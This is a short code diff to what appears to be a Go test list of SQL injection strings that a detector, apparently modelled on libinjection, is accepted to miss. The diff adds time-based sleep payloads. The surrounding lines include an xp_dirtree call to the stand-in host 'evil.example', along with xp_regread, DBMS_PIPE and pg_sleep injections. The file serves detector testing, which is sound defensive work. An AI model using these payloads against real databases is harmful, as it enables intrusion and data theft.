@@ -133,6 +133,10 @@ var sqlTokenAcceptedMisses = []string{
 	"; exec xp_regread",
 	"exec master..xp_dirtree '//evil.example/x'",
 	"DBMS_PIPE.RECEIVE_MESSAGE('a',5)",
+	"9, sleep(5)",
+	"x or sleep (5)",
+	"x||sleep(5)",
+	"x or sleep(@d)",
 	// 8. A nested block comment between the parts of a token: the comment
 	// ends at the first "*/" (libinjection flags both).
 	"pg_sleep/* /* */ */(5)",
